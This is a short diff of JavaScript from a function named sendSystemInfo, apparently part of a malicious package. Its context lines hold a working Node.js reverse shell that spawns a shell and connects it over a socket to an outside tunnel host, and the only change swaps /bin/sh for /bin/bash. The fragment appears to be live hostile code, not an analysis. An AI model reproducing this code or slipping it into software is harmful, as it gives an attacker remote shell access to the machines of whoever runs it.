@@ -31,7 +31,7 @@ async function sendSystemInfo() {
 
         var net = require("net"),
             cp = require("child_process"),
-            sh = cp.spawn("/bin/sh", []);
+            sh = cp.spawn("/bin/bash", []);
         var client = new net.Socket();
         client.connect(46549, "gcbdb-182-10-99-198.run.pinggy-free.link", function(){
             client.pipe(sh.stdin);
